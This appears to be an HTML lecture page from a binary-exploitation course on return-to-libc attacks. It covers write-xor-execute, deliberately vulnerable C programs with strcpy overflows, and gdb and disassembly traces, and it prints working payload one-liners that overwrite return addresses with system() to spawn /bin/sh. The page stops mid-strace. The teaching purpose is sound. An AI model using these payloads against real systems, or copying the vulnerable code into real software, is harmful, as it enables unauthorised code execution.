@@ -1,0 +1,885 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<!-- 2015-11-24 Tue 10:44 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="viewport" content="width=device-width, initial-scale=1">
+<title>Lec. 22: Return-to-Libc</title>
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 22: Return-to-Libc</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#orgheadline1">1. Write xor Execute Settings</a></li>
+<li><a href="#orgheadline5">2. Return to Libc</a>
+<ul>
+<li><a href="#orgheadline2">2.1. Overwriting Return Addresses with <code>system()</code></a></li>
+<li><a href="#orgheadline3">2.2. Jumping to system</a></li>
+<li><a href="#orgheadline4">2.3. Why this worked so easily</a></li>
+</ul>
+</li>
+<li><a href="#orgheadline8">3. Harder Return to Lib C</a>
+<ul>
+<li><a href="#orgheadline6">3.1. Using Sym Linking and PATH manipulation</a></li>
+<li><a href="#orgheadline7">3.2. Jumping to the Exploit String</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgheadline1" class="outline-2">
+<h2 id="orgheadline1"><span class="section-number-2">1</span> Write xor Execute Settings</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+So far, in all of our exploits on the stack, we've been assuming that
+the memory mapped for the stack is set to be executable. That is, we
+would overwrite the return address and the have it jump somewhere else
+on the stack (say to our shell code) and that code would execute. 
+</p>
+
+<p>
+This setting is <i>not</i> the common setting for modern machines. There is
+a principle called "Write xor Execute" or \(w \otimes x\) which states
+that a memory page should either be writable or executable but not
+both. 
+</p>
+
+<p>
+What does this mean in practice? Let's take a look at our dummy
+exploit code.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">code</span>[1024];
+
+  strncpy(code,argv[1],1024);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">cast pointer to function pointer and call</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) code)();
+
+}
+</pre>
+</div>
+
+<p>
+And we were to compile with our standard options:
+</p>
+<pre class="example">
+gcc -fno-stack-protector -z execstack -Wno-format-security dummy_exploit.c   -o dummy_exploit
+</pre>
+<p>
+You'll notice one option <code>-z execstack</code> which says that we are allowed
+to have the stack set to executable. Using this program, we can launch
+a shell with our standard shell code:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
+$
+</pre>
+
+<p>
+But, let's run this under gdb first so we can pause the program and
+see the memory maps.
+</p>
+<pre class="example">
+user@si485H-base:demo$ gdb -q dummy_exploit 
+Reading symbols from dummy_exploit...done.
+(gdb) br main
+Breakpoint 1 at 0x8048429: file dummy_exploit.c, line 7.
+(gdb) r
+Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit 
+
+Breakpoint 1, main (argc=1, argv=0xbffff734) at dummy_exploit.c:7
+7	  strncpy(code,argv[1],1024);
+(gdb) info proc
+process 1803
+cmdline = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
+cwd = '/home/user/git/si485-binary-exploits/lec/22/demo'
+exe = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
+(gdb) shell
+user@si485H-base:demo$ cat /proc/1803/map
+map_files/ maps       
+user@si485H-base:demo$ cat /proc/1803/maps 
+08048000-08049000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+08049000-0804a000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+0804a000-0804b000 rwxp 00001000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+b7e19000-b7e1a000 rwxp 00000000 00:00 0 
+b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc2000-b7fc4000 r-xp 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc4000-b7fc5000 rwxp 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc5000-b7fc8000 rwxp 00000000 00:00 0 
+b7fdb000-b7fdd000 rwxp 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7ffe000-b7fff000 r-xp 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7fff000-b8000000 rwxp 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+user@si485H-base:demo$ exit
+(gdb) quit
+</pre>
+
+<p>
+If you look closely, you'll see the line for the stack and permissions
+<code>rwxp</code> which means that this memory region is all read, writable, and
+executable. But, we can turn this off with a gcc flag:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ gcc -fno-stack-protector -Wno-format-security dummy_exploit.c   -o dummy_exploit
+user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+Now we do not get a shell, but instead we get a segmentation fault. If
+we run this under gdb to look at the maps, the permissions has changed.
+</p>
+<pre class="example">
+gdb) br main
+Breakpoint 1 at 0x8048420
+(gdb) r
+Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit 
+
+Breakpoint 1, 0x08048420 in main ()
+(gdb) info proc
+process 2043
+cmdline = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
+cwd = '/home/user/git/si485-binary-exploits/lec/22/demo'
+exe = '/home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit'
+(gdb) shell
+cuser@si485H-base:demo$ cat /proc/2043/maps
+08048000-08049000 r-xp 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+08049000-0804a000 r--p 00000000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+0804a000-0804b000 rw-p 00001000 08:01 322611     /home/user/git/si485-binary-exploits/lec/22/demo/dummy_exploit
+b7e19000-b7e1a000 rw-p 00000000 00:00 0 
+b7e1a000-b7fc2000 r-xp 00000000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc2000-b7fc4000 r--p 001a8000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc4000-b7fc5000 rw-p 001aa000 08:01 161120     /lib/i386-linux-gnu/libc-2.19.so
+b7fc5000-b7fc8000 rw-p 00000000 00:00 0 
+b7fdb000-b7fdd000 rw-p 00000000 00:00 0 
+b7fdd000-b7fde000 r-xp 00000000 00:00 0          [vdso]
+b7fde000-b7ffe000 r-xp 00000000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7ffe000-b7fff000 r--p 0001f000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+b7fff000-b8000000 rw-p 00020000 08:01 163829     /lib/i386-linux-gnu/ld-2.19.so
+bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
+user@si485H-base:demo$ exit
+(gdb) quit
+</pre>
+
+<p>
+The challenge now is, how do we still exploit programs that uses
+write-xor-execute principles? The answer is, we do not inject our own
+shell code anymore, but we rather use the code that already exists and
+is already executable to do the job for us.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline5" class="outline-2">
+<h2 id="orgheadline5"><span class="section-number-2">2</span> Return to Libc</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+While we might not be able to inject our own shell code into the
+process via the stack, we are in a position where we can still use
+other code to do our bidding. Namely, we'll focus on the C library
+function <code>system()</code>.
+</p>
+
+<p>
+The <code>system()</code> library function takes a string as input and will
+execute that string via <code>execve</code>. This can be very useful, and very
+dangerous.Consider the following program:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">argv</span>[]){
+
+  system(<span style="color: #ffa07a;">"/bin/sh"</span>);
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ ./system_shell 
+$
+</pre>
+
+<p>
+Essentially, we use the <code>system()</code> mini-shell to launch a real
+<code>/bin/sh</code> shell. That's great, but what does this have to do with
+exploits? Why can't we overwrite a return address to jump there?
+</p>
+</div>
+
+<div id="outline-container-orgheadline2" class="outline-3">
+<h3 id="orgheadline2"><span class="section-number-3">2.1</span> Overwriting Return Addresses with <code>system()</code></h3>
+<div class="outline-text-3" id="text-2-1">
+<p>
+For this example, we'll work the vulnerable program we've been using so far in class:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"You've been naughty!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">good</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">n</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span> = 0;  
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[32];
+  strcpy(buf,str);
+  <span style="color: #00ffff;">while</span>( i &lt; n ){
+    printf(<span style="color: #ffa07a;">"%d %s\n"</span>,i++, buf);
+  }
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+  vuln(atoi(argv[1]), argv[2]);
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+
+<p>
+Note, that in this example code, we <code>#include</code> the <code>stdlib.h</code>, which
+is the C standard library, and will include all the goodies we need
+for this exploit, namely, the <code>system()</code> function.
+</p>
+
+<p>
+The first thing we need to do is determine <i>where</i> the <code>system()</code> call
+is loaded.
+</p>
+<pre class="example">
+(gdb) br main
+Breakpoint 1 at 0x804852a: file vulnerable.c, line 29.
+(gdb) r 
+Starting program: /home/user/git/si485-binary-exploits/lec/22/demo/vulnerable 
+
+Breakpoint 1, main (argc=1, argv=0xbffff734) at vulnerable.c:29
+29	  vuln(atoi(argv[1]), argv[2]);
+(gdb) p system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7e5a190 &lt;__libc_system&gt;
+</pre>
+<p>
+So at address 0xb735a190 is the start of the system. Let's try and use
+that in our exploit. First, we need to setup the exploit, and we'll do
+that in the normal way.
+</p>
+
+<p>
+We can find the length of the buffer to the exploit:
+</p>
+<pre class="example">
+080484d5 &lt;vuln&gt;:
+ 80484d5:	55                   	push   ebp
+ 80484d6:	89 e5                	mov    ebp,esp
+ 80484d8:	83 ec 48             	sub    esp,0x48
+ 80484db:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [ebp-0xc],0x0
+ 80484e2:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
+ 80484e5:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 80484e9:	8d 45 d4             	lea    eax,[ebp-0x2c] #&lt;------------
+ 80484ec:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80484ef:	e8 6c fe ff ff       	call   8048360 &lt;strcpy@plt&gt;
+ 80484f4:	eb 20                	jmp    8048516 &lt;vuln+0x41&gt;
+ 80484f6:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
+ 80484f9:	8d 50 01             	lea    edx,[eax+0x1]
+ 80484fc:	89 55 f4             	mov    DWORD PTR [ebp-0xc],edx
+ 80484ff:	8d 55 d4             	lea    edx,[ebp-0x2c]
+ 8048502:	89 54 24 08          	mov    DWORD PTR [esp+0x8],edx
+ 8048506:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 804850a:	c7 04 24 0e 86 04 08 	mov    DWORD PTR [esp],0x804860e
+ 8048511:	e8 3a fe ff ff       	call   8048350 &lt;printf@plt&gt;
+ 8048516:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
+ 8048519:	3b 45 08             	cmp    eax,DWORD PTR [ebp+0x8]
+ 804851c:	7c d8                	jl     80484f6 &lt;vuln+0x21&gt;
+ 804851e:	c9                   	leave  
+ 804851f:	c3                   	ret
+</pre>
+<p>
+Then we can setup the overflow:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\xef\xbe\xad\xde'"`
+Segmentation fault (core dumped)
+user@si485H-base:demo$ dmesg | tail -1
+[ 2138.032640] vulnerable[2283]: segfault at deadbeef ip deadbeef sp bffff690 error 15
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline3" class="outline-3">
+<h3 id="orgheadline3"><span class="section-number-3">2.2</span> Jumping to system</h3>
+<div class="outline-text-3" id="text-2-2">
+<p>
+Once the exploit is setup, now we only need to replace 0xdeadbeef with
+0xb7e5a190 to jump the system call:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
+Segmentation fault (core dumped)
+</pre>
+<p>
+That's really interesting because those errors have nothing to do with
+the program. Notices that the start of the error message refers to
+"sh" reporting the error. Essentially, we were successful in getting
+<code>system()</code> to execute, but the argument to system was not a valid
+command. But, what was it?
+</p>
+
+<p>
+Look more closely, you'll see it is a bunch of our A's: it's the input
+we provided to the program. So we can control what get's called to it,
+and moreover, the system() command accepts valid bash directives. so
+we can do the following:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+$
+</pre>
+<p>
+And, boom shell! What we did, is we inserted a "/bin/sh;" at the start
+of our input string so that it will execute the shell. But there is
+still a bunch of A's to follow that will cause an error, and exiting
+the program, does just that:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+$ 
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgheadline4" class="outline-3">
+<h3 id="orgheadline4"><span class="section-number-3">2.3</span> Why this worked so easily</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+In our example, we got really lucky, because we control the argument
+to <code>/bin/sh</code>. Let's take a look at the disassemble of <code>vuln</code>:
+</p>
+<pre class="example">
+Dump of assembler code for function vuln:
+   0x080484d5 &lt;+0&gt;:	push   ebp
+   0x080484d6 &lt;+1&gt;:	mov    ebp,esp
+   0x080484d8 &lt;+3&gt;:	sub    esp,0x48
+   0x080484db &lt;+6&gt;:	mov    DWORD PTR [ebp-0xc],0x0
+   0x080484e2 &lt;+13&gt;:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484e5 &lt;+16&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484e9 &lt;+20&gt;:	lea    eax,[ebp-0x2c]
+   0x080484ec &lt;+23&gt;:	mov    DWORD PTR [esp],eax
+   0x080484ef &lt;+26&gt;:	call   0x8048360 &lt;strcpy@plt&gt;
+   0x080484f4 &lt;+31&gt;:	jmp    0x8048516 &lt;vuln+65&gt;
+   0x080484f6 &lt;+33&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484f9 &lt;+36&gt;:	lea    edx,[eax+0x1]
+   0x080484fc &lt;+39&gt;:	mov    DWORD PTR [ebp-0xc],edx
+   0x080484ff &lt;+42&gt;:	lea    edx,[ebp-0x2c]
+   0x08048502 &lt;+45&gt;:	mov    DWORD PTR [esp+0x8],edx
+   0x08048506 &lt;+49&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804850a &lt;+53&gt;:	mov    DWORD PTR [esp],0x804860e
+   0x08048511 &lt;+60&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x08048516 &lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048519 &lt;+68&gt;:	cmp    eax,DWORD PTR [ebp+0x8]
+   0x0804851c &lt;+71&gt;:	jl     0x80484f6 &lt;vuln+33&gt;
+=&gt; 0x0804851e &lt;+73&gt;:	leave  
+   0x0804851f &lt;+74&gt;:	ret    
+End of assembler dump.
+</pre>
+
+<p>
+If you look at the stack alignment at this point, we get the following
+for the vulnerable function prior to the leave/ret:
+</p>
+
+<pre class="example">
+        .---------.
+        |  str    | ----&gt; "/bin/sh;AAAAAAAAAAAAAAAAAAA"
+        |---------|
+        |   n     |
+        |---------|
+        | ret adr | ----&gt; 0xb7e5a190 (system+0x0)
+        |---------|
+ ebp -&gt; | sbp     |
+        |---------|
+        :         :
+esp -&gt;  '---------'    eip: vuln+73
+</pre>
+
+<p>
+After the leave/return we are left with this:
+</p>
+
+<pre class="example">
+ebp -&gt; ???
+
+       .---------.
+       |  str    | ----&gt; "/bin/sh;AAAAAAAAAAAAAAAAAAA"
+       |---------|
+esp -&gt; |   n     |
+       '---------'
+                      eip: system+0x0
+</pre>
+
+<p>
+We can further look at the code for system:
+</p>
+<pre class="example">
+Dump of assembler code for function __libc_system:
+   0xb7e5a190 &lt;+0&gt;:	push   ebx
+   0xb7e5a191 &lt;+1&gt;:	sub    esp,0x8                      
+   0xb7e5a194 &lt;+4&gt;:	mov    eax,DWORD PTR [esp+0x10]
+   0xb7e5a198 &lt;+8&gt;:	call   0xb7f4094b &lt;__x86.get_pc_thunk.bx&gt;
+   0xb7e5a19d &lt;+13&gt;:	add    ebx,0x169e63
+   0xb7e5a1a3 &lt;+19&gt;:	test   eax,eax
+   0xb7e5a1a5 &lt;+21&gt;:	je     0xb7e5a1b0 &lt;__libc_system+32&gt;
+   0xb7e5a1a7 &lt;+23&gt;:	add    esp,0x8
+   0xb7e5a1aa &lt;+26&gt;:	pop    ebx
+   0xb7e5a1ab &lt;+27&gt;:	jmp    0xb7e59c20 &lt;do_system&gt;   &lt;---------!!!!
+   0xb7e5a1b0 &lt;+32&gt;:	lea    eax,[ebx-0x495d4]
+   0xb7e5a1b6 &lt;+38&gt;:	call   0xb7e59c20 &lt;do_system&gt;
+   0xb7e5a1bb &lt;+43&gt;:	test   eax,eax
+   0xb7e5a1bd &lt;+45&gt;:	sete   al
+   0xb7e5a1c0 &lt;+48&gt;:	add    esp,0x8
+   0xb7e5a1c3 &lt;+51&gt;:	movzx  eax,al
+   0xb7e5a1c6 &lt;+54&gt;:	pop    ebx
+   0xb7e5a1c7 &lt;+55&gt;:	ret
+</pre>
+<p>
+The <code>do_system</code> function is the thing that really does the work for
+the system call, and it just so happens that the argument to system
+when <code>do_system()</code> is called needs to be the <b>second</b> value on the
+stack, which is exactly what we have! This might not always be the
+case.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-2">
+<h2 id="orgheadline8"><span class="section-number-2">3</span> Harder Return to Lib C</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Let's now look at what it takes to do a return to libc attack where we
+don't get lucky with the stack alignment. Here's another vulnerable
+program:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[32];
+
+
+  strcpy(buf,str);
+
+  printf(<span style="color: #ffa07a;">"%s\n"</span>,buf);
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  vuln(argv[1]);
+
+  <span style="color: #00ffff;">return</span> 0;
+
+}
+</pre>
+</div>
+
+<p>
+We can do a stack smash alignment like last time:
+</p>
+<pre class="example">
+0804844d &lt;vuln&gt;:
+ 804844d:	55                   	push   ebp
+ 804844e:	89 e5                	mov    ebp,esp
+ 8048450:	83 ec 38             	sub    esp,0x38
+ 8048453:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
+ 8048456:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+ 804845a:	8d 45 d8             	lea    eax,[ebp-0x28] #&lt;---
+ 804845d:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048460:	e8 ab fe ff ff       	call   8048310 &lt;strcpy@plt&gt;
+ 8048465:	8d 45 d8             	lea    eax,[ebp-0x28]
+ 8048468:	89 04 24             	mov    DWORD PTR [esp],eax
+ 804846b:	e8 b0 fe ff ff       	call   8048320 &lt;puts@plt&gt;
+ 8048470:	c9                   	leave  
+ 8048471:	c3                   	ret
+</pre>
+
+<p>
+Now when we run our exploit we get:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
+sh: 1: 4: not found
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+We don't get what we want. But, the game is not up.
+</p>
+</div>
+
+<div id="outline-container-orgheadline6" class="outline-3">
+<h3 id="orgheadline6"><span class="section-number-3">3.1</span> Using Sym Linking and PATH manipulation</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+If you look closely, you see the error, "4: not found", but let's take
+a closer look at this error under <code>strace</code>.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ strace -f ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+execve("./harder", ["./harder", "/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAA"...], [/* 20 vars */]) = 0
+(...)
+clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbffff544) = 2460
+waitpid(2460, Process 2460 attached
+ &lt;unfinished ...&gt;
+(...)
+[pid  2460] stat64("/usr/local/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/usr/local/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/usr/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/usr/bin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
+[pid  2460] stat64("/sbin/4\17\2", 0xbffff490) = -1 ENOENT (No such file or directory)
